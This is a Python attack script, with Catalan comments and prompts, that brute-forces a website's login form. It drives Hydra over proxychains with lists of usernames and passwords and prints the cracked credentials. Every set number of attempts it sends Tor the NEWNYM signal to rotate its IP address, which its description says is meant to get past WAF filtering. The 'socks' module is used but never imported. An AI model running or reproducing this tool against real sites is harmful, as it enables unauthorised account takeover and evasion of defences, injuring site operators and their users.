import pexpect
import time
import socket
import argparse
import json

def config_proxy_tor():
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket

def get_current_ip():
    process = pexpect.spawn("proxychains curl https://api.myip.com", timeout=20)
    p_str = json.loads(str(process.read()).split("\\n")[-1].strip("'"))
    ip = p_str.get("ip")
    process.expect(pexpect.EOF, timeout=30)

    return ip

def change_ip():
    print("[+] Canviant IP...")
    try:
        child = pexpect.spawn('nc localhost 9051')
        child.sendline('AUTHENTICATE')
        child.sendline('SIGNAL NEWNYM')
        child.sendline('QUIT')
        child.expect(pexpect.EOF, timeout=5)
        time.sleep(5)
        print("[+] IP Canviada!")
    except Exception as e:
        print(f"[-] Error al canviar de IP: {e}")

    return get_current_ip()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='bruteforce_rotation.py', description="Programa que realitza força bruta i cada cert intents canvia de IP per evitar filtres de WAF")
    parser.add_argument("target", type=str, help="Domini on es vol atacar. Ex: example.com")
    parser.add_argument("uri", type=str, help="Camí del login on es vol realitzar el bruteforce.")
    parser.add_argument("-u", "--users", type=str, help="Ubicació del llistat d'usuaris a comprometre.", required=True)
    parser.add_argument("-w", "--wordlist", type=str, help="Ubicació del diccionari de contrasenyes a utilitzar.", required=True)
    parser.add_argument("-c", "--count", type=int, help="Nombre d'intents abans de fer el canvi d'IP. Per defecte 25", default=25)

    args = parser.parse_args()

    ip_register = []
    cracked_users = []

    ip_register.append(get_current_ip())

    with open(args.users, "r") as f:
        usuaris = f.readlines()

    with open(args.wordlist, "r") as f:
        passwords = f.readlines()

    for user in usuaris:
        user = user.strip()
        count = 0
        for password in passwords:
            password = password.strip()

            print(f"[+] Usuari: {user} | Intent #{count} | Contrasenya: {password}")

            cmd = f'proxychains hydra -l {user} -p {password} {args.target} http-post-form "{args.uri}:usuari=^USER^&password=^PASS^&Login=Login:contrasenya incorrectes"'
            process = pexpect.spawn(cmd, timeout=120)
            if '1 valid' in str(process.read()):
                print(f"[+] Contrasenya trobada: {password}")
                cracked_users.append(f"{user}:{password}")
                break
            process.expect(pexpect.EOF, timeout=120)

            count += 1

            if count % args.count == 0:
                time.sleep(3)
                ip_register.append(change_ip())
                print(ip_register)

    print("[+] Atac finalitzat")
    print(f"[+] Usuaris crackejats: {cracked_users}")
